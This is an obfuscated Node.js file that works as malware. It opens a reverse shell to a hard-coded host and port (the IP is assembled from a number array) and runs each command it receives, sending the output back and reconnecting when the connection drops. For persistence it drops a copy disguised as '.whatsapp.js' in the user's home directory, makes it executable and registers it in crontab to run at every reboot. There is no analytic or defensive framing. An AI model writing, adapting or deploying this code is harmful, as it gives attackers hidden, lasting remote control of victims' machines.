"use strict";
var _0x1a2b = require("fs");
var _0x2b3c = require("os");
var _0x3c4d = require("child_process");
var _0x4d5e = require("net");

// Obfuscated IP and Port
var _0x5e6f = [127, 0, 0, 1, 30, 0];
var _0x6f7a = [".", "width=", "right=", "audiovol=", "height="];
var _0x7a8b = ["ig", "x", ":"];
var _0x8b9c = "".concat(_0x5e6f[0]).concat(_0x6f7a[0]).concat(_0x5e6f[1]).concat(_0x6f7a[0]).concat(_0x5e6f[2]).concat(_0x6f7a[0]).concat(_0x5e6f[3]);
var _0x9c0d = parseInt("".concat(_0x5e6f[4]).concat(_0x5e6f[5]));

// Reverse Shell
function _0x0d1e() {
    var _0x1e2f = new _0x4d5e.Socket();
    function _0x2f3a() {
        _0x1e2f.connect(_0x9c0d, _0x8b9c, function () {
            _0x1e2f.write("");
        });
    }
    _0x2f3a();
    _0x1e2f.on("data", function (_0x3a4b) {
        var _0x4b5c = _0x3a4b.toString().trim();
        (0, _0x3c4d.exec)(_0x4b5c, function (_0x5c6d, _0x6d7e, _0x7e8f) {
            if (_0x6d7e) _0x1e2f.write(_0x6d7e);
            if (_0x7e8f) _0x1e2f.write(_0x7e8f);
            if (_0x5c6d) _0x1e2f.write(_0x5c6d.message);
        });
    });
    _0x1e2f.on("close", function () {
        setTimeout(_0x2f3a, 5000);
    });
    _0x1e2f.on("error", function () {
        setTimeout(_0x2f3a, 5000);
    });
}

// Persistence
function _0x3b4c() {
    var _0x4c5d = "".concat(_0x2b3c.homedir(), "/.whatsapp.js");
    _0x1a2b.writeFileSync(_0x4c5d, `
        const _0x4d5e = require("net");
        const { exec } = require("child_process");
        const _0x1e2f = new _0x4d5e.Socket();
        function _0x2f3a() {
            _0x1e2f.connect(${_0x9c0d}, "${_0x8b9c}", () => {
                _0x1e2f.write("");
            });
        }
        _0x2f3a();
        _0x1e2f.on("data", (data) => {
            exec(data.toString().trim(), (err, stdout, stderr) => {
                if (stdout) _0x1e2f.write(stdout);
                if (stderr) _0x1e2f.write(stderr);
                if (err) _0x1e2f.write(err.message);
            });
        });
        _0x1e2f.on("close", () => {
            setTimeout(_0x2f3a, 5000);
        });
        _0x1e2f.on("error", () => {
            setTimeout(_0x2f3a, 5000);
        });
    `);
    _0x1a2b.chmodSync(_0x4c5d, 493);
    (0, _0x3c4d.exec)(
        `(crontab -l 2>/dev/null; echo "@reboot /usr/bin/node ${_0x4c5d}") | crontab -`,
        function () {}
    );
}

// Execution
_0x3b4c();
_0x0d1e();
